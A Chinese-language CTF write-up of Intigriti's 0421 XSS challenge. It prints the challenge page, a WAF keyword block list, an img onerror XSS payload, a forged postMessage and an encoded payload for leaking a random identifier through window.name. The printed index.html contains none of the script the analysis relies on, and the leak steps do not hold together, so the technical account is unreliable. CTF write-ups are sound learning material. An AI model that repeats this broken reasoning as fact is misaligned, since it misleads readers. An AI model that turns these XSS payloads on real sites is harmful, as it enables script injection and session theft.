# Intigriti史上最难XSS挑战Writeup

## 译文声明
本文为翻译文章，具体内容表达及含义以原文为准。

## 0x00 前言
Intigriti XSS Challenge 0421 被官方誉为迄今为止 **Intigriti史上最难的XSS挑战**。在有效提交期内，全球仅有15名黑客、CTF选手和漏洞猎人成功通过挑战并获得flag。
该挑战由@terjanq根据其在实际漏洞挖掘中遇到的真实WAF绕过场景编写。挑战地址如下：
- 使用最新版的Firefox或Chrome浏览器
- 使用`alert()`弹窗显示`flag{THIS_IS_THE_FLAG}`
- 利用页面中的XSS漏洞
- 不允许self-XSS 和 MiTM 攻击
- 无需用户交互

本人也在提交期内对该挑战进行了尝试，对整个网页及其背后的WAF逻辑进行了分析研究，但未能在有效提交期内通关。通过赛后公布的PoC，我对个人思路和通关思路进行了复盘，形成本WP，供共同学习交流。感兴趣的小伙伴也可以自行尝试，感受该XSS挑战的难度和乐趣！

## 0x01 代码分析
### 网页源码分析
题目网页主要包括两个文件：`index.html` 和 `waf.html`。

#### index.html
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Intigriti April Challenge</title>
</head>
<body>
    <h1>Intigriti's 0421 XSS challenge - by @terjanq</h1>
    <p>Error: something went wrong. Please try again!</p>
    <p>Find a way to execute arbitrary JavaScript on this page and win Intigriti swag.</p>
    <ul>
        <li>This challenge runs from April 19 until April 25th, 11:59 PM CET.</li>
        <li>Out of all correct submissions, we will draw six winners on Monday, April 26th:</li>
        <ul>
            <li>Three randomly drawn correct submissions</li>
            <li>Three best write-ups</li>
        </ul>
        <li>Every winner gets a €50 swag voucher for our swag shop</li>
        <li>The winners will be announced on our Twitter profile.</li>
        <li>For every 100 likes, we'll add a tip to the announcement tweet.</li>
    </ul>
    <p>The solution...</p>
    <ul>
        <li>Should work on the latest version of Firefox or Chrome</li>
        <li>Should alert() the following flag: flag{THIS_IS_THE_FLAG}</li>
        <li>Should leverage a cross-site scripting vulnerability on this page</li>
        <li>Shouldn't be self-XSS or related to MiTM attacks</li>
        <li>Should not use any user interaction</li>
        <li>Should be reported at go.intigriti.com/submit-solution</li>
    </ul>
</body>
</html>
```

#### waf.html
```javascript
onmessage = e => {
    const identifier = e.data.identifier;
    e.source.postMessage({
        type: 'waf',
        identifier,
        str: e.data.str,
        safe: (new WAF()).isSafe(e.data.str)
    }, '*');
}

function WAF() {
    const forbidden_words = ['<script>', '</script>', 'eval(', 'setTimeout(', 'setInterval(', 'innerHTML', 'innerText'];
    
    this.isSafe = function (str) {
        return !forbidden_words.some(word => str.includes(word));
    };
}
```

### 分析与思路
1. **寻找一个可以绕过WAF的payload**
   - WAF对许多标签和字符进行了限制，如`<script>`、`eval(`等。
   - 需要找到一种方法来绕过这些限制。

2. **通过`postMessage`构造合适的消息，触发XSS条件**
   - 输入值会通过`postMessage`传递给`waf`，并进行安全性检查。
   - 只有当`safe: true`时，输入才会被赋值给`div.innerHTML`。

3. **突破`identifier`随机值的限制**
   - `identifier`是随机生成的，需要找到一种方法将其泄露出来。

### 绕过WAF
通过分析，我发现`<img>`标签不在WAF的禁止范围内，并且可以插入`onXXX=`事件。因此，我尝试了以下payload：
```html
<img src="https://example.com" onerror="alert('flag{THIS_IS_THE_FLAG}')">
```
这个payload成功绕过了WAF的检测。

### 通过`postMessage`触发XSS
为了触发XSS，我构造了以下消息：
```javascript
window.postMessage({
    type: 'waf',
    identifier: "tze8f445ssb7",
    str: '<img src="https://example.com" onerror="alert(\'flag{THIS_IS_THE_FLAG}\')">',
    safe: true
}, '*');
```
通过这种方式，可以在`safe: true`的情况下触发XSS。

### 突破`identifier`随机值的限制
为了泄露`identifier`，我利用了`window.name`特性。通过构造特定的循环，逐步泄露`identifier`的每一位值。具体步骤如下：

1. 构造初始payload：
   ```html
   <img src="https://challenge-0421.intigriti.io/?error=#%0Aif(location.hash+/0/.source%26%26++window.name)%7B%0A++window.name+=location.hash%5B1%5D%3E%3Didentifier%5B0%5D%3F%221%22%3A%220%22%3B%0A%7D%0A%2F%2F">
   ```

2. 通过13次操作，逐步泄露`identifier`的每一位值。

3. 每个循环开始前将`window.name`归零。

通过这种方式，最终成功泄露了`identifier`的值，并完成了XSS挑战。

希望这篇Writeup能帮助大家更好地理解和解决类似的XSS挑战！